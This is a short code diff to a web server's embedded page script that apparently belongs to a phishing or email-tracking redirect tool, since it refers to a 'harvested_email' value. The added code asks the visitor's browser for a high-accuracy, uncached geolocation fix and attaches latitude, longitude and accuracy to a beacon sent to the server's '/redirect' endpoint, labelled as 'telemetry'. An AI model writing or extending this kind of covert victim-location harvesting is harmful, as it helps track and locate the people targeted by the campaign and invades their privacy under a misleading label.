@@ -333,14 +333,38 @@ public sealed class WebServer
             return window.harvested_email || harvested_email || '';
         }
 
-        fetch('/redirect?' + params.toString(), {
-            method: 'GET',
-            credentials: 'omit',
-            cache: 'no-store',
-            headers: { 'Accept': 'application/json' }
-        }).catch(function() {
-            // Best-effort telemetry only.
-        });
+        // Request high-precision geolocation if available
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    params.append('latitude', position.coords.latitude);
+                    params.append('longitude', position.coords.longitude);
+                    params.append('accuracy', position.coords.accuracy);
+                    sendTelemetry();
+                },
+                function(error) {
+                    sendTelemetry();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            sendTelemetry();
+        }
+
+        function sendTelemetry() {
+            fetch('/redirect?' + params.toString(), {
+                method: 'GET',
+                credentials: 'omit',
+                cache: 'no-store',
+                headers: { 'Accept': 'application/json' }
+            }).catch(function() {
+                // Best-effort telemetry only.
+            });
+        }
     });
 })();
 </script>
